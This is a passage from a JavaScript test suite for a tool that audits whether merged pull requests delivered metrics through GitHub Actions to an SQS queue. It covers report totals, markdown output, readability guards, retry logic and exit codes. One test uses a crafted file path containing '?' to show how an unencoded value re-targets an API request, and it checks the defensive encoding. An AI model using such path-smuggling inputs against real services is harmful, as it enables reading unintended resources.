  assert.match(md, /only a backfill will score them/);
});

test('renderMarkdown: in_flight and pre_onboarding caveats COMBINE rather than one masking the other', () => {
  // The reason the sentence is built from the totals instead of written per
  // case: with both classes non-zero, an if/else-if would name one and silently
  // drop the other, which is how pre_onboarding went unreported in the first
  // place. Both counts must survive.
  const both = {
    since: '2026-05-06',
    totals: { merged_prs: 40, delivered: 30, in_flight: 3, pre_onboarding: 7 },
    repos_with_gaps: [],
    repos: [{ repo: 'guard', has_caller: true }],
  };

  const md = renderMarkdown(both, CFG);

  assert.match(md, /\*\*3\*\* are not yet decided/);
  assert.match(md, /\*\*7\*\* merged before this repo had a caller/);
  assert.match(md, /Of \*\*40\*\* merged PR\(s\)/);
  assert.doesNotMatch(md, /No gaps\. Every merged PR in the window enqueued a successful metrics delivery\./);
});

test('renderMarkdown: with NOTHING undecided the unqualified clean sentence is still used', () => {
  // The control that stops the two tests above from passing against a version
  // that simply never emits the clean sentence. A genuinely fully-verified
  // window must still say so plainly — hedging every report would train readers
  // to ignore the hedge.
  const fullyClean = {
    since: '2026-07-05',
    totals: { merged_prs: 12, delivered: 12, in_flight: 0, pre_onboarding: 0 },
    repos_with_gaps: [],
    repos: [{ repo: 'guard', has_caller: true }],
  };

  const md = renderMarkdown(fullyClean, CFG);

  assert.match(md, /No gaps\. Every merged PR in the window enqueued a successful metrics delivery\./);
  assert.doesNotMatch(md, /No gaps among the PRs this audit can decide/);
  assert.doesNotMatch(md, /merged before this repo had a caller/);
});

// ── buildReport ──────────────────────────────────────────────────────────────

test('buildReport: totals sum every class across repos', () => {
  const results = [
    // Each repo's per-class counts add up to its merged count, so a class the
    // sum forgets shows up as a total that does not reconcile.
    repoResult('guard', {
      merged: 13,
      delivered: [rec(1), rec(2), rec(3)],
      failed: [rec(4)],
      never_fired: [rec(5), rec(6)],
      skipped_anomaly: [rec(7)],
      pre_onboarding: [rec(8), rec(9), rec(10)],
      in_flight: [rec(11)],
      payload_missing: [rec(12)],
      unverifiable: [rec(13)],
    }),
    repoResult('palatine', {
      merged: 9,
      delivered: [rec(20)],
      failed: [rec(21), rec(22)],
      never_fired: [],
      skipped_anomaly: [],
      pre_onboarding: [rec(23)],
      in_flight: [rec(24), rec(25)],
      payload_missing: [rec(26), rec(27)],
      unverifiable: [rec(28)],
    }),
  ];

  const report = buildReport(results, { since: '2026-07-05', selfAudit: false }, 137);

  // Hand-summed: 13+9, 3+1, 1+2, 2+0, 1+0, 3+1, 1+2, 1+2, 1+1. deepEqual rather
  // than per-key: an added class that nothing sums is exactly the drift to catch
  // — and it caught payload_missing when that class was added.
  assert.deepEqual(report.totals, {
    merged_prs: 22,
    delivered: 4,
    failed: 3,
    never_fired: 2,
    skipped_anomaly: 1,
    pre_onboarding: 4,
    in_flight: 3,
    payload_missing: 3,
    unverifiable: 2,
  });
  // The class list this suite derives its fixtures from must match the one
  // buildReport actually sums. Without this, a class added to classify() but not
  // to totals would leave every fixture carrying it and every assertion silently
  // agreeing that it does not exist.
  assert.deepEqual(Object.keys(report.totals).slice(1).sort(), [...CLASS_KEYS].sort());
  // Cross-check: every merged PR is accounted for by exactly one class.
  const { merged_prs: m, ...classes } = report.totals;
  assert.equal(Object.values(classes).reduce((a, b) => a + b, 0), m);
  assert.equal(report.fleet_size, 2);
  assert.equal(report.api_calls, 137);
  assert.equal(report.since, '2026-07-05');
  assert.equal(report.mode, 'fleet');
});

test('buildReport: mode reflects selfAudit', () => {
  const results = [repoResult('guard', { merged: 1, delivered: [rec(1)] })];
  assert.equal(buildReport(results, { since: '2026-07-05', selfAudit: true }, 1).mode, 'self');
  assert.equal(buildReport(results, { since: '2026-07-05', selfAudit: false }, 1).mode, 'fleet');
});

test('buildReport: a pre-onboarding-ONLY repo is not a repo with gaps', () => {
  // This is the difference between a useful detector and one that cries wolf.
  // guard-like repo: everything undelivered is pre-onboarding → no alert.
  // palatine-like repo: one real failure → alert.
  const results = [
    repoResult('pre-onboarding-only', {
      merged: 8,
      delivered: [rec(1), rec(2)],
      pre_onboarding: [rec(3), rec(4), rec(5), rec(6), rec(7), rec(8)],
    }),
    repoResult('really-broken', {
      merged: 3,
      delivered: [rec(30), rec(31)],
      failed: [rec(32)],
    }),
  ];

  const report = buildReport(results, { since: '2026-07-05', selfAudit: false }, 1);

  assert.deepEqual(
    report.repos_with_gaps.map((g) => g.repo),
    ['really-broken'],
  );
  // The pre-onboarding PRs are still COUNTED — they are reported, just not
  // alerted on. Suppressing them from totals would hide the backfill decision.
  assert.equal(report.totals.pre_onboarding, 6);
  assert.equal(report.fleet_size, 2);
});

test('buildReport: each of the three gap classes alone is enough to raise a gap', () => {
  for (const cls of ['failed', 'never_fired', 'skipped_anomaly']) {
    const report = buildReport(
      [repoResult('r', { merged: 1, [cls]: [rec(1)] })],
      { since: '2026-07-05', selfAudit: true },
      1,
    );
    assert.deepEqual(
      report.repos_with_gaps.map((g) => g.repo),
      ['r'],
      `${cls} alone should raise a gap`,
    );
  }
});

test('buildReport: an all-delivered fleet has no gaps at all', () => {
  const report = buildReport(
    [
      repoResult('a', { merged: 2, delivered: [rec(1), rec(2)] }),
      repoResult('b', { merged: 1, delivered: [rec(3)] }),
    ],
    { since: '2026-07-05', selfAudit: false },
    5,
  );

  assert.deepEqual(report.repos_with_gaps, []);
  assert.equal(report.totals.delivered, 3);
  assert.equal(report.totals.merged_prs, 3);
});

test('buildReport: a gap entry carries the per-class counts and the numeric replay list', () => {
  const report = buildReport(
    [
      repoResult('guard', {
        merged: 7,
        failed: [rec(100)],
        never_fired: [rec(9)],
        skipped_anomaly: [rec(10)],
        pre_onboarding: [rec(1)],
        in_flight: [rec(2)],
        payload_missing: [rec(50)],
        unverifiable: [{ ...rec(77), unverifiable_reason: UNVERIFIABLE_REAPED }],
      }),
    ],
    { since: '2026-07-05', selfAudit: true },
    1,
  );

  assert.deepEqual(report.repos_with_gaps, [
    {
      repo: 'guard',
      failed: 1,
      never_fired: 1,
      skipped_anomaly: 1,
      pre_onboarding: 1,
      in_flight: 1,
      payload_missing: 1,
      unverifiable: 1,
      payload_missing_prs: [50],
      unverifiable_prs: [77],
      // Carried per repo, and from the RECORDS rather than restated in prose:
      // the class has more than one cause now, and a sentence naming one is
      // false for whichever half it does not name.
      unverifiable_reasons: [UNVERIFIABLE_REAPED],
      replay: [9, 10, 100],
    },
  ]);
  // Reported on the entry, absent from the replay list: #77's run record aged
  // out, so replaying it would re-deliver a PR that may well have delivered.
  assert.equal(report.repos_with_gaps[0].replay.includes(77), false);
  // Reported on the entry, absent from the replay list: #50 ran and succeeded,
  // but enqueued nothing, and replaying it re-delivers nothing.
  assert.equal(report.repos_with_gaps[0].replay.includes(50), false);
  // Reported on the entry, absent from the replay list: #2 is running, not lost.
  assert.equal(report.repos_with_gaps[0].replay.includes(2), false);
});

test('buildReport: an in_flight-ONLY repo is not a repo with gaps', () => {
  // An unconcluded run is an UNKNOWN, not a gap. Raising on it would make the
  // audit's verdict depend on how close it happened to run to a merge — the same
  // repo would alert or not alert depending on the minute the cron fired.
  const results = [
    repoResult('mid-flight', {
      merged: 3,
      delivered: [rec(1), rec(2)],
      in_flight: [rec(3)],
    }),
    repoResult('really-broken', { merged: 1, failed: [rec(30)] }),
  ];

  const report = buildReport(results, { since: '2026-07-05', selfAudit: false }, 1);

  assert.deepEqual(
    report.repos_with_gaps.map((g) => g.repo),
    ['really-broken'],
  );
  // Counted and reported, just not alerted on.
  assert.equal(report.totals.in_flight, 1);
});

test('buildReport output feeds renderMarkdown without shape drift', () => {
  // Guards the seam between the two exports: renderMarkdown reads
  // report.repos[].has_caller and report.repos_with_gaps[].replay, both of
  // which buildReport is responsible for producing.
  const results = [
    {
      ...repoResult('guard', { merged: 3, delivered: [rec(1)], never_fired: [rec(9), rec(10)] }),
      has_caller: false,
    },
  ];
  const cfg = {
    since: '2026-07-05',
    selfAudit: true,
    owner: 'praetorian-inc',
    backfillCaller: 'leaderboard-backfill-caller.yml',
  };

  const md = renderMarkdown(buildReport(results, cfg, 3), cfg);

  assert.match(md, /### `guard`/);
  assert.match(md, /has no `leaderboard-metrics\.yml` caller/);
  assert.match(md, /-f pr_numbers='9,10'/);
  assert.match(md, /Merged PRs examined: \*\*3\*\*/);
});

// ── assertReadable: a 404 on the REPO must not read as a clean audit ──────────

test('assertReadable: an unreadable repo THROWS instead of yielding a clean report', () => {
  // The dangerous shape, and the reason this is not merely defensive: gh() maps
  // 404 -> {__missing:true} deliberately, because "no caller file here" and "no
  // runs for a workflow that does not exist" are real answers its callers must be
  // free to read as absence. With no repo-level check, a typo'd --repo makes EVERY
  // endpoint answer 404: zero merged PRs, zero gaps, exit 0 CLEAN. (ghPaged used
  // to return [] on a 404 as well; round 16 made it throw. That closes the
  // paginated half but not this one — the probes below and runsInRange's
  // total_count probe both go through gh, where __missing is still a value.)
  const client = { gh: async () => ({ __missing: true }) };
  return assert.rejects(
    () => assertReadable(client, { owner: 'praetorian-inc' }, 'guardd'),
    /praetorian-inc\/guardd: repository not found, or not readable by this token/,
  );
});

test('assertReadable: a readable repo passes and does not disturb the audit', async () => {
  const client = { gh: async () => ({ name: 'guard', archived: false }) };
  const meta = await assertReadable(client, { owner: 'praetorian-inc' }, 'guard');
  assert.equal(meta.name, 'guard');
});

test('assertReadable: a null body is treated as unreadable, not as readable', () => {
  // Distinct from __missing: a 200 with an empty body would sail past a check
  // written as `if (meta.__missing)` and then throw on property access later,
  // far from the cause.
  const client = { gh: async () => null };
  return assert.rejects(
    () => assertReadable(client, { owner: 'praetorian-inc' }, 'guard'),
    /refusing to audit it/,
  );
});

// ── resolveFleet: an explicitly named repo must not be silently dropped ───────

const FLEET_CFG = {
  owner: 'praetorian-inc',
  callerPath: '.github/workflows/leaderboard-metrics.yml',
  reusable: 'praetorian-inc/public-workflows/.github/workflows/leaderboard-metrics.yml@',
};

// Mirrors the two endpoints resolveFleet reaches through, keyed by repo name so a
// mixed list can have per-repo behaviour. `readable` false makes EVERY path 404
// for that repo, which is what a typo or an invisible private repo actually looks
// like — not a special-cased contents 404.
const fleetClient = (repos) => {
  const calls = [];
  return {
    calls,
    gh: async (url) => {
      calls.push(url);
      const m = url.match(/^\/repos\/[^/]+\/([^/?]+)(\/contents\/.*)?$/);
      const state = repos[m[1]];
      if (!state || !state.readable) return { __missing: true };
      if (!m[2]) return { name: m[1] };
      if (!state.caller) return { __missing: true };
      return {
        content: Buffer.from(
          `jobs:\n  m:\n    uses: ${FLEET_CFG.reusable}v1\n`,
        ).toString('base64'),
      };
    },
  };
};

test('resolveFleet: one unreadable entry in an explicit --repos list REFUSES the audit', async () => {
  // The live regression, measured before the fix: `--repos
  // caeruleus,nonexistent-repo-xyz --since 2026-05-06` printed
  // `mode=fleet repos=1 ... FAILED=0` and exited 0. The typo'd repo was struck by
  // hasCaller's 404 -> false, the zero-fleet guard did not fire because one repo
  // survived, and the report read clean over a fleet missing a requested subject.
  const client = fleetClient({
    caeruleus: { readable: true, caller: true },
    'nonexistent-repo-xyz': { readable: false },
  });

  await assert.rejects(
    () => resolveFleet(client, { ...FLEET_CFG, repos: ['caeruleus', 'nonexistent-repo-xyz'] }),
    /praetorian-inc\/nonexistent-repo-xyz: repository not found/,
  );
});

test('resolveFleet: the readability probe runs BEFORE the caller probe', async () => {
  // Ordering IS the fix — assertReadable already existed in main(), which runs
  // after this filtering and therefore only ever saw the survivors. A version
  // that asserted afterwards would still drop the repo first, so only call order
  // distinguishes the fixed code from the broken code.
  const client = fleetClient({ typo: { readable: false } });

  await assert.rejects(() => resolveFleet(client, { ...FLEET_CFG, repos: ['typo'] }), /not found/);
  // The repo-level probe must be the first thing asked about this repo. If a
  // /contents/ URL appears first, the caller probe got there before the guard.
  assert.equal(client.calls[0], '/repos/praetorian-inc/typo');
  assert.doesNotMatch(client.calls[0], /\/contents\//);
});

test('resolveFleet: the caller path is percent-encoded per SEGMENT before the request', async () => {
  // The other half of the traversal fix, and it does not follow from the first:
  // rejecting `..` in parseArgs does nothing about `?` or `#`, which re-target
  // the request by starting a query or a fragment rather than by walking up.
  // `.github/wo?rk/x.yml` has a valid basename and no traversal segment, so it
  // reaches here — and unencoded it requests `/repos/o/r/contents/.github/wo`
  // with `rk/x.yml` as the query string, i.e. a different resource whose answer
  // is then read as this repo's caller file.
  const client = fleetClient({ guard: { readable: true, caller: true } });

  const fleet = await resolveFleet(client, {
    ...FLEET_CFG,
    repos: ['guard'],
    callerPath: '.github/wo?rk/x.yml',
  });
  assert.deepEqual(fleet, ['guard']);

  const contents = client.calls.filter((u) => u.includes('/contents/'));
  assert.equal(contents.length, 1);
  assert.equal(contents[0], '/repos/praetorian-inc/guard/contents/.github/wo%3Frk/x.yml');
  // Encoded per segment, so the separators SURVIVE. Encoding the whole string
  // would send `%2F` for every `/`, which the contents API does not read as a
  // directory separator — that would 404 on the default path, i.e. on every
  // repo, which the zero-fleet guard then reports as a broken fleet probe.
  assert.equal(contents[0].includes('%2F'), false);
});

test('resolveFleet: a READABLE repo with no caller is still dropped, not an error', async () => {
  // The control, and the distinction the fix rests on: "not onboarded" is a real
  // answer and must stay a silent drop, while "cannot read it" must throw. Before
  // the fix both produced the same silent drop, which is exactly why a typo was
  // undetectable. Without this test the guard could pass by throwing on every
  // repo that fails the caller probe.
  const client = fleetClient({
    caeruleus: { readable: true, caller: true },
    'not-onboarded': { readable: true, caller: false },
  });

  const fleet = await resolveFleet(client, {
    ...FLEET_CFG,
    repos: ['caeruleus', 'not-onboarded'],
  });

  assert.deepEqual(fleet, ['caeruleus']);
});

test('resolveFleet: org-wide discovery does NOT assert readability per repo', async () => {
  // Deliberate asymmetry. In org mode the names come from an enumeration the
  // token can already see, and a repo it cannot read was never a requested
  // subject — so skipping it is correct rather than a lost subject. Asserting
  // here would also turn every archived-or-restricted org repo into a hard
  // failure of the whole fleet audit.
  const client = {
    calls: [],
    ghPaged: async () => [
      { name: 'caeruleus', archived: false, disabled: false },
      { name: 'locked-down', archived: false, disabled: false },
    ],
    gh: async (url) => {
      client.calls.push(url);
      if (url.includes('locked-down')) return { __missing: true };
      return {
        content: Buffer.from(`uses: ${FLEET_CFG.reusable}v1`).toString('base64'),
      };
    },
  };

  const fleet = await resolveFleet(client, { ...FLEET_CFG, repos: null });

  assert.deepEqual(fleet, ['caeruleus']);
  // And it never made a bare repo-metadata call, which is what would prove the
  // explicit-list guard had leaked into discovery mode.
  assert.equal(
    client.calls.filter((u) => !u.includes('/contents/')).length,
    0,
  );
});

// ── verifyPayloads: a `success` run that enqueued nothing ─────────────────────

// Modelled on guard run 28112331529 (2026-06-24, author `xoverride`): the run
// concluded SUCCESS with "Configure AWS credentials" and "Send metrics to SQS"
// both `skipped`, because no author resolved through ENGINEER_EMAIL_MAP.
const jobsWith = (sqsConclusion) => ({
  jobs: [
    {
      steps: [
        { name: 'Set up job', conclusion: 'success' },
        { name: 'Collect PR metrics', conclusion: 'success' },
        { name: 'Configure AWS credentials', conclusion: sqsConclusion },
        { name: SQS_STEP, conclusion: sqsConclusion },
      ],
    },
  ],
});

const jobsClient = (byRun) => ({
  gh: async (url) => byRun[url.match(/runs\/(\d+)\/jobs/)[1]],
});

test('verifyPayloads: a skipped SQS step is NOT a delivery', async () => {
  const client = jobsClient({ 111: jobsWith('skipped'), 222: jobsWith('success') });
  const v = await verifyPayloads(client, { owner: 'praetorian-inc' }, 'guard', [
    { number: 1, run_id: 111 },
    { number: 2, run_id: 222 },
  ]);
  assert.equal(v.get(111), 'not_sent');
  assert.equal(v.get(222), 'sent');
});

test('verifyPayloads: a MISSING step name throws rather than defaulting to delivered', () => {
  // The fail-open this fix exists to close, one layer up: a name probe that
  // answers "fine" when it finds nothing has the same shape as the bug. A
  // rename of the reusable's step must stop the audit (exit 2 UNKNOWN), not
  // silently restore "every success is a delivery".
  const client = jobsClient({ 333: { jobs: [{ steps: [{ name: 'Send to SQS', conclusion: 'success' }] }] } });
  return assert.rejects(
    () => verifyPayloads(client, { owner: 'praetorian-inc' }, 'guard', [{ number: 3, run_id: 333 }]),
    /has no step named "Send metrics to SQS"/,
  );
});

test('verifyPayloads: a 404 on the jobs endpoint is UNVERIFIABLE, not sent and not fatal', async () => {
  // __missing means the steps could not be read at all, which is not evidence of
  // a delivery — and not evidence of its absence either. Round 19 changed WHICH
  // non-answer this is: it used to throw, taking the whole fleet audit down (exit
  // 2, no report for any repo) over one deleted or aged run. `unverifiable` is
  // the class that already existed for "cannot be decided" — replayList excludes
  // it, the report names it with a reason, and the other repos still get audited.
  const rec = { number: 4, run_id: 444 };
  const client = jobsClient({ 444: { __missing: true } });
  const v = await verifyPayloads(client, { owner: 'praetorian-inc' }, 'guard', [rec]);
  assert.equal(v.get(444), 'unverifiable');
  // NOT 'not_sent'. That verdict demotes the record to payload_missing, which
  // asserts this PR delivered nothing and sends an operator to replay — a write
  // to the prod queue, built on a run nobody could read.
  assert.notEqual(v.get(444), 'not_sent');
  assert.equal(rec.unverifiable_reason, UNVERIFIABLE_JOBS_UNREADABLE);
});

test('verifyPayloads: an unreadable jobs list does NOT blame the step name', () => {
  // The original version of this test asserted /has no step named/ for the 404
  // case and so PINNED a misleading diagnosis: __missing produced steps=[], the
  // step lookup missed, and the operator was told to update SQS_STEP when the
  // real cause was that the run's jobs could not be read at all (a run past its
  // retention window, typically). The reason on the record must name its own
  // repair, so this asserts the rename text is ABSENT from it — now checked on
  // the reason string rather than on an exception, since this case no longer
  // throws.
  const rec = { number: 4, run_id: 444 };
  const client = jobsClient({ 444: { __missing: true } });
  return verifyPayloads(client, { owner: 'praetorian-inc' }, 'guard', [rec]).then(() => {
    assert.match(rec.unverifiable_reason, /could not be read/);
    assert.doesNotMatch(rec.unverifiable_reason, /has no step named/);
    assert.doesNotMatch(rec.unverifiable_reason, /step names have changed/);
    // And it must not name the OTHER unreadable cause either: reaped step history
    // is repaired by narrowing the window, a 404 is not.
    assert.doesNotMatch(rec.unverifiable_reason, /reaps step history/);
  });
});

test('verifyPayloads: asks for a FULL page of jobs, not the default 30', async () => {
  // The endpoint pages at 30 by default. A run with more jobs than one page
  // would truncate, the present delivery step would read as absent, and the
  // audit would stop at exit 2 blaming a rename.
  const urls = [];
  const client = {
    gh: async (url) => {
      urls.push(url);
      return jobsWith('success');
    },
  };
  await verifyPayloads(client, { owner: 'praetorian-inc' }, 'guard', [{ number: 1, run_id: 111 }]);
  assert.equal(urls.length, 1);
  assert.match(urls[0], /\/actions\/runs\/111\/jobs\?per_page=100$/);
});

test('verifyPayloads: a TRUNCATED job list throws instead of reading a present step as absent', () => {
  // per_page=100 raises the ceiling, it does not remove it. The server's own
  // total_count is the only way to notice, and the failure it prevents is silent
  // in the dangerous direction: a delivery step that EXISTS on job 101 would
  // otherwise look like a rename and take the whole repo to exit 2.
  const client = jobsClient({
    555: { total_count: 140, jobs: [{ steps: [{ name: SQS_STEP, conclusion: 'success' }] }] },
  });
  return assert.rejects(
    () => verifyPayloads(client, { owner: 'praetorian-inc' }, 'guard', [{ number: 5, run_id: 555 }]),
    /reports 140 jobs but only 1 were returned/,
  );
});

test('verifyPayloads: total_count matching the returned length is NOT truncation', async () => {
  // Control for the check above: it must not fire on the normal single-page
  // case, or every run would fail as truncated.
  const client = jobsClient({
    666: { total_count: 1, jobs: [{ steps: [{ name: SQS_STEP, conclusion: 'skipped' }] }] },
  });
  const v = await verifyPayloads(client, { owner: 'praetorian-inc' }, 'guard', [
    { number: 6, run_id: 666 },
  ]);
  assert.equal(v.get(666), 'not_sent');
});

test('applyPayloadVerdicts: demotes only the unsent runs and leaves the rest delivered', () => {
  const classes = {
    delivered: [
      { number: 1, run_id: 111 },
      { number: 2, run_id: 222 },
      { number: 3, run_id: 333 },
    ],
    payload_missing: [],
  };
  applyPayloadVerdicts(
    classes,
    new Map([
      [111, 'not_sent'],
      [222, 'sent'],
      [333, 'not_sent'],
    ]),
  );
  assert.deepEqual(
    classes.delivered.map((r) => r.number),
    [2],
  );
  assert.deepEqual(
    classes.payload_missing.map((r) => r.number),
    [1, 3],
  );
  // The record says WHY, so the JSON artifact explains the demotion on its own.
  assert.equal(classes.payload_missing[0].payload, 'missing');
});

test('applyPayloadVerdicts: an empty verdict map leaves every delivery intact', () => {
  // Guards the direction that would be catastrophic: a probe that returned
  // nothing must not demote the whole fleet into a 1000-PR phantom gap.
  const classes = { delivered: [{ number: 1, run_id: 111 }], payload_missing: [] };
  applyPayloadVerdicts(classes, new Map());
  assert.equal(classes.delivered.length, 1);
  assert.equal(classes.payload_missing.length, 0);
});

test('applyPayloadVerdicts: an unverifiable verdict is neither delivered nor a payload gap', () => {
  // The third verdict, and the one a mutation showed was untested here: the two
  // tests above only ever feed `sent`/`not_sent`, so deleting this branch left the
  // suite green while an undecidable row silently stayed on `delivered`. Both
  // other verdicts are CLAIMS — "it sent" and "the author has no score" — and
  // this class is the absence of one, so it must land in neither.
  const classes = {
    delivered: [
      { number: 1, run_id: 111 },
      { number: 2, run_id: 222 },
      { number: 3, run_id: 333 },
    ],
    payload_missing: [],
    unverifiable: [],
  };
  applyPayloadVerdicts(
    classes,
    new Map([
      [111, 'unverifiable'],
      [222, 'sent'],
      [333, 'not_sent'],
    ]),
  );
  assert.deepEqual(classes.delivered.map((r) => r.number), [2]);
  assert.deepEqual(classes.payload_missing.map((r) => r.number), [3]);
  assert.deepEqual(classes.unverifiable.map((r) => r.number), [1]);
  // And specifically NOT carrying the payload_missing stamp, which is what an
  // operator reads as "edit ENGINEER_EMAIL_MAP and re-run" — a prod write.
  assert.equal(classes.unverifiable[0].payload, undefined);
});

test('replayList: payload_missing is EXCLUDED — replay cannot fix an unmapped author', () => {
  // Replaying re-runs collect-metrics against the same unresolvable author and
  // enqueues nothing again, while still writing to the prod queue for the other
  // PRs in the batch. The backfill says as much itself. The repair is a map edit.
  const list = replayList({
    failed: [rec(4)],
    never_fired: [rec(5)],
    skipped_anomaly: [],
    payload_missing: [rec(99)],
  });
  assert.deepEqual(list, [4, 5]);
});

test('buildReport: payload_missing alone makes a repo a GAP repo', () => {
  // The class is unreplayable, so keying the gap verdict off the replay list
  // would report a repo whose every defect is unfixable-by-replay as clean.
  const report = buildReport(
    [repoResult('guard', { merged: 2, delivered: [rec(1)], payload_missing: [rec(2)] })],
    { since: '2026-07-01', selfAudit: true, backfillCaller: 'leaderboard-backfill.yml' },
    10,
  );
  assert.equal(report.repos_with_gaps.length, 1);
  assert.equal(report.totals.payload_missing, 1);
  assert.deepEqual(report.repos_with_gaps[0].payload_missing_prs, [2]);
  assert.deepEqual(report.repos_with_gaps[0].replay, [], 'not replayable');
});

test('renderMarkdown: names the map fix and emits NO replay command when that is the only gap', () => {
  const report = buildReport(
    [repoResult('guard', { merged: 2, delivered: [rec(1)], payload_missing: [rec(2)] })],
    { since: '2026-07-01', selfAudit: true, backfillCaller: 'leaderboard-backfill.yml' },
    10,
  );
  const md = renderMarkdown(report, { owner: 'praetorian-inc', backfillCaller: 'leaderboard-backfill.yml' });
  assert.match(md, /ran successfully but sent no payload/);
  assert.match(md, /ENGINEER_EMAIL_MAP/);
  assert.match(md, /Unmapped-author PRs \(1\): #2/);
  // The load-bearing absence: a `-f pr_numbers=''` paste would dispatch a
  // backfill over nothing, and telling someone to replay these is wrong advice.
  assert.doesNotMatch(md, /pr_numbers=/);
  assert.doesNotMatch(md, /Affected PRs \(0\)/);
});

test('renderMarkdown: both a replayable gap and an unmapped-author gap are reported separately', () => {
  const report = buildReport(
    [repoResult('guard', { merged: 3, never_fired: [rec(7)], payload_missing: [rec(8)] })],
    { since: '2026-07-01', selfAudit: true, backfillCaller: 'leaderboard-backfill.yml' },
    10,
  );
  const md = renderMarkdown(report, { owner: 'praetorian-inc', backfillCaller: 'leaderboard-backfill.yml' });
  assert.match(md, /Unmapped-author PRs \(1\): #8/);
  assert.match(md, /Affected PRs \(1\): #7/);
  // #8 must NOT reach the replay command even when a command is emitted for #7.
  assert.match(md, /-f pr_numbers='7'/);
  assert.doesNotMatch(md, /pr_numbers='7,8'/);
});

test('renderMarkdown: the header does not claim a delivery it only inferred from a conclusion', () => {
  const report = buildReport(
    [repoResult('guard', { merged: 1, delivered: [rec(1)] })],
    { since: '2026-07-01', selfAudit: true },
    5,
  );
  const md = renderMarkdown(report, { owner: 'praetorian-inc' });
  assert.match(md, /verified to have actually\s+enqueued a payload/);
});

// ── The fetch stub: what it is for, and what it is not for ───────────────────
//
// `withFetch` below is this file's only `fetch` stub. Deliberately stated as a
// CRITERION and not as a count of sites or areas — an enumeration here goes
// stale the moment a case is added, which is exactly the defect this note
// replaced.
//
// The header's stance still holds: mocking the API to re-assert the API's own
// semantics would only test the mock, and that is not what any use below does.
// What they stub is this script's OWN control flow over the transport —
// makeClient's retry and its exact attempt cap, ghPaged's Link walk and
// declared-key dedupe, ghCount's row-count probe, and the fail-closed refusals
// in each. Those failure modes are losing a whole repo's audit to one dropped
// socket, or silently returning a short list, and a live-API test cannot
// provoke either on demand — which is precisely why they are stubbed here
// rather than left to the live validation.

const withFetch = async (impl, fn) => {
  const real = globalThis.fetch;
  globalThis.fetch = impl;
  try {
    return await fn();
  } finally {
    globalThis.fetch = real;
  }
};

const okRes = (body) => ({
  status: 200,
  ok: true,
  headers: new Headers(),
  json: async () => body,
});

test('makeClient: a REJECTED fetch is retried, not propagated as an audit failure', async () => {
  // A dropped socket / DNS blip / TLS reset makes fetch REJECT, which used to
  // bypass the attempt loop entirely and abort the audit as exit-2 UNKNOWN over
  // the whole repo — the same consequence the 5xx retries exist to prevent, and
  // likelier across the ~880 calls a wide guard window now makes.
  let attempts = 0;
  const body = await withFetch(
    async () => {
      attempts++;
      if (attempts === 1) throw new TypeError('fetch failed');
      return okRes({ ok: true });
    },
    () => makeClient('t').gh('/repos/praetorian-inc/guard'),
  );
  assert.equal(attempts, 2, 'must retry once and then succeed');
  assert.deepEqual(body, { ok: true });
});

test('makeClient: a fetch rejecting on every attempt fails after exactly 4 attempts', async () => {
  // Bounded by the same cap as the status retries: retrying a genuinely broken
  // endpoint must not spin, and the final error has to carry the transport cause
  // rather than surfacing as a bare "unreachable".
  let attempts = 0;
  await withFetch(
    async () => {
      attempts++;
      throw new TypeError('ECONNRESET');
    },
    () =>
      assert.rejects(
        () => makeClient('t').gh('/repos/praetorian-inc/guard'),
        /fetch failed on .* after 4 attempts: ECONNRESET/,
      ),
  );
  assert.equal(attempts, 4, 'exactly the 4-attempt cap, no more and no fewer');
});

test('makeClient: counts a rejected attempt in api_calls', async () => {
  // api_calls is reported to the operator as what the audit cost. A retried
  // transport failure consumed a request whether or not it produced a response,
  // so omitting it would understate the real load.
  let attempts = 0;
  const client = makeClient('t');
  await withFetch(
    async () => {
      attempts++;
      if (attempts === 1) throw new TypeError('fetch failed');
      return okRes({});
    },
    () => client.gh('/repos/praetorian-inc/guard'),
  );
  assert.equal(client.state.calls, 2);
});

test('the script sets process.exitCode and never calls process.exit', async () => {
  // process.exit() terminates without flushing stdout, which under the Actions
  // runner is a PIPE and therefore asynchronous. Measured on node 22 against a
  // slow consumer: process.exit(1) delivered 56 of 2001 written lines and lost
  // the final one — here that is the `mode=… payload_missing=N` summary and the
  // GAP lines, i.e. precisely the evidence explaining the exit code. Pinned at
  // the source level because the failure is invisible in a fast-reader test:
  // `node … | wc -l` drains the pipe as fast as it fills, so nothing ever queues
  // and the bug cannot reproduce.
  const { readFileSync } = await import('node:fs');
  const src = readFileSync(new URL('./audit-delivery.mjs', import.meta.url), 'utf8');
  const offenders = src
    .split('\n')
    .map((line, i) => [i + 1, line])
    .filter(([, line]) => !line.trim().startsWith('//'))
    .filter(([, line]) => /process\.exit\s*\(/.test(line));
  assert.deepEqual(
    offenders,
    [],
    `process.exit() truncates buffered stdout; use process.exitCode (+ return). Offending lines: ${JSON.stringify(offenders)}`,
  );
  // And the replacement is actually present, so this cannot pass by the calls
  // simply having been deleted.
  assert.match(
    src,
    /process\.exitCode = report\.repos_with_gaps\.length \? 1 : undecided \? 3 : 0;/,
  );
  assert.match(src, /process\.exitCode = 2;/);
});

test('the early-abort paths RETURN after setting exitCode', async () => {
  // Setting exitCode does not stop execution. The token check and the zero-fleet
  // check are guards INSIDE main(), so exitCode alone would fall through — the
  // token path into makeClient(undefined) and a full unauthenticated audit,
  // which is the exact failure that check exists to prevent. The `return` is
  // load-bearing, and a literal reading of "replace process.exit with exitCode"
  // would have removed it.
  const { readFileSync } = await import('node:fs');
  const src = readFileSync(new URL('./audit-delivery.mjs', import.meta.url), 'utf8');
  for (const guard of ['GITHUB_TOKEN (or GH_TOKEN) is unset', 'resolved ZERO caller repos']) {
    const at = src.indexOf(guard);
    assert.ok(at > 0, `guard not found: ${guard}`);
    const after = src.slice(at, at + 700);
    const exitAt = after.indexOf('process.exitCode = 2;');
    assert.ok(exitAt > 0, `no exitCode assignment after: ${guard}`);
    assert.match(
      after.slice(exitAt, exitAt + 120),
      /process\.exitCode = 2;\s*\n\s*return;/,
      `the guard for "${guard}" must return immediately after setting exitCode, or it falls through`,
    );
  }
});

// ── round-5 findings: the head_sha join collision, and rename blindness ───────
//
// Both are silent-direction defects — each makes a real gap read as delivered or
// excused — so both tests assert a THROW. The pair of literals in the first test
// is guard's real #2938/#2939 case (branch `mario-prod` into main and prod), not
// an invented shape.

test('classify: two merged PRs on the SAME head_sha refuse to be joined', () => {
  const prs = [
    pr(2938, '2026-07-01T00:00:00Z', '8e27899b22b4091667b39ea3487c51dbb3855e35'),
    pr(2939, '2026-07-02T00:00:00Z', '8e27899b22b4091667b39ea3487c51dbb3855e35'),
  ];
  // One success is all it takes: pre-fix, dedupeByHead's success-first winner was
  // credited to BOTH PRs, so #2939's absent delivery reported as delivered.
  const byHead = dedupeByHead([
